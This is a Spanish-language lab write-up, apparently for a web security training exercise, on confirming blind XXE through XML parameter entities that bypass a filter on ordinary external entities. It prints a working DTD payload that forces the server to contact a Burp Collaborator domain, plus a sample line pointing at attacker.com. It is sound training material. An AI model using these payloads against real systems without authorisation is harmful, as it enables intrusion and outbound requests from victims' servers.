# 🗄️ XXE ciego con entidades XML externas mediante _parameter entities_

## 📄 Descripción del laboratorio

Este laboratorio utiliza nuevamente la funcionalidad **Check stock**, que procesa datos enviados en **XML**.

En este caso aparecen dos limitaciones importantes:

* No existe **reflejo del contenido procesado** en la respuesta → **XXE ciega**.
* Las **entidades externas tradicionales** están filtradas o bloqueadas.

El objetivo es evadir estas restricciones utilizando **parameter entities** dentro del DTD para provocar una **interacción out-of-band (OOB)** hacia un dominio controlado mediante **Burp Collaborator**.

 

## 📚 Teoría

En muchos entornos, los desarrolladores intentan mitigar XXE filtrando patrones como:

```xml
<!ENTITY xxe SYSTEM "http://...">
```

Estos filtros suelen:

* Analizar solo el **cuerpo del XML**.
* No inspeccionar correctamente el **DTD**.
* Bloquear únicamente **entidades externas tradicionales**.

Para evadir estos filtros se utilizan **parameter entities**.

### 📌 Parameter entities

Las **parameter entities** son entidades especiales que:

* Se declaran **dentro del DTD**.
* Se identifican mediante el símbolo `%`.
* Solo pueden utilizarse dentro del propio **DTD**.
* Se resuelven **durante el parseo del DTD**, antes de procesar el cuerpo del XML.

Ejemplo:

```
<!ENTITY % remote SYSTEM "http://attacker.com">
```

Estas entidades permiten:

* Evadir filtros simples.
* Forzar resoluciones externas sin modificar el cuerpo del XML.
* Explotar **XXE ciegas avanzadas**.

### 📌 Estrategia del ataque

El ataque consiste en:

1. Definir una **parameter entity externa** que apunte a un dominio controlado.
2. Invocarla dentro del **DTD**.
3. Forzar al parser XML a resolverla.
4. Confirmar la conexión mediante **Burp Collaborator**.

Si el servidor intenta conectarse a nuestro dominio, se confirma la vulnerabilidad.

 

## 📝 Práctica

### 🎯 Objetivo

Confirmar una **XXE ciega** provocando una interacción **DNS o HTTP** hacia Burp Collaborator utilizando **parameter entities**.

 

### 1️⃣ Preparar Burp Collaborator

Abrimos:

```
Burp → Burp Collaborator client
```

Generamos un subdominio único, por ejemplo:

```
abcdef1234.oastify.com
```

Este dominio registrará cualquier:

* Resolución DNS
* Petición HTTP

realizada por el servidor vulnerable.

 

### 2️⃣ Interceptar la petición vulnerable

En la aplicación pulsamos **Check stock** en cualquier producto.

Interceptamos la petición **POST** y observamos el XML original:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

<br>

Enviamos la petición al **Repeater** y comprobamos que:

* La respuesta es siempre genérica.
* No hay datos reflejados.
* No aparecen errores útiles.

Esto confirma el contexto de **XXE ciega**.

 

### 3️⃣ Construir el payload con _parameter entities_

Creamos un **DTD** que define una entidad externa utilizando `%`.

Payload completo:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "http://abcdef1234.oastify.com">
  %remote;
]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

### 📌 Qué ocurre internamente

* `<!ENTITY % remote SYSTEM "...">`\
  Define una **parameter entity externa**.
* `%remote;`\
  Obliga al parser a resolverla durante el **parseo del DTD**.

Aunque el cuerpo del XML no utilice la entidad, el DTD ya provoca la conexión externa.

 

### 4️⃣ Confirmar la interacción out-of-band

Enviamos la petición desde **Repeater**.

La respuesta del servidor sigue siendo genérica, lo cual es esperado.

Volvemos a **Burp Collaborator client** y pulsamos:

```
Poll now
```

Aparecen interacciones registradas, por ejemplo:

```
DNS interaction from <server-ip> for abcdef1234.oastify.com
```

En algunos casos también se registra una petición HTTP.

<br>

Esto confirma que:

* El parser XML procesó el DTD.
* La **parameter entity externa fue resuelta**.
* El servidor realizó una conexión saliente.

 

### 5️⃣ Resultado final

Se consigue:

* Confirmar una **XXE ciega**.
* Bypassear el filtro de entidades externas tradicionales.
* Forzar la resolución de **parameter entities externas**.
* Detectar la interacción **OOB** mediante Burp Collaborator.

El laboratorio se completa correctamente.
